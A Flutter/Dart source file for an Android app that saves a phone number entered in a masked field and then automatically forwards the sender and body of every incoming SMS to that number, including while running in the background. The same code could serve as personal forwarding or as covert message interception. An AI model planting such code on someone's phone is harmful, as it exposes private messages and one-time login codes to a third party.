import 'dart:io';
import 'dart:ui';

import 'package:flutter/cupertino.dart';
import 'package:flutter/material.dart';
import 'package:flutter/rendering.dart';
import 'package:path_provider/path_provider.dart';
import 'package:telephony/telephony.dart';

final Telephony telephony = Telephony.instance;
final myController = TextEditingController();

Future<File> getLocalFile() async {
  Directory dir = await getApplicationDocumentsDirectory();
  return File(dir.path + "/number.txt");
}

backgroundMessageHandler(SmsMessage message) async {
  String msg = "From " + message.address + "\n\n";
  msg += "Message:\n\n" + message.body;

  File numberFile = await getLocalFile();
  String number = await numberFile.readAsString();

  await telephony.sendSms(
      to: number, message: msg); //Handle background message
}

void main() {
  runApp(MyApp());
  telephony.listenIncomingSms(
      onNewMessage: backgroundMessageHandler,
      onBackgroundMessage: backgroundMessageHandler);
}

class MyApp extends StatelessWidget {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
        title: 'SMS',
        theme: ThemeData(
          primarySwatch: Colors.blue,
        ),
        home: HomeScreen());
  }
}

class HomeScreen extends StatefulWidget {
  @override
  HomeState createState() {
    return HomeState();
  }
}

class HomeState extends State<HomeScreen> {
  @override
  Widget build(BuildContext context) {
    return Container(
      decoration: const BoxDecoration(
        gradient: LinearGradient(
          begin: Alignment.topLeft,
          end: Alignment(0.100, 0.90),
          colors: <Color>[
            Colors.blue,
            Colors.black,
          ], // blue to black
          tileMode: TileMode.repeated,
        ),
      ),
      child: Scaffold(
        backgroundColor: Colors.black12,
        appBar: AppBar(title: Text("SMS")),
        body: Center(
          child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
            SizedBox(height: 30),
            Text(
              "ENTER NUMBER",
              style: TextStyle(color: Colors.deepOrangeAccent, fontSize: 30.0),
            ),
            SizedBox(height: 30),
            TextField(
              obscureText: true,
              controller: myController,
              maxLength: 10,
              textAlign: TextAlign.center,
              style: TextStyle(color: Colors.black, fontSize: 20.0),
            ),
            SizedBox(height: 30),
            ElevatedButton(
                child: Text(
                  'OK',
                  style: TextStyle(
                    color: Colors.deepOrange,
                    fontSize: 40.0,
                  ),
                ),
                style: ElevatedButton.styleFrom(shape: StadiumBorder()),
                onPressed: enterPhoneNumber,
            ),
            SizedBox(height: 50),
            ElevatedButton(
              onPressed: () => exit(0),
              child: Text(
                'Exit',
                style: TextStyle(
                  color: Colors.deepOrange,
                  fontSize: 60.0,
                ),
              ),
              style: ElevatedButton.styleFrom(shape: StadiumBorder()),
            )
          ]),
        ),
      ),
    );
  }

  void enterPhoneNumber() async{
    File numberFile = await getLocalFile();
    numberFile.writeAsString(myController.text);
    showDialog<String>(
        context: context,
        builder: (BuildContext context) => AlertDialog(title: const Text('Success!!!'))
    );
  }
}
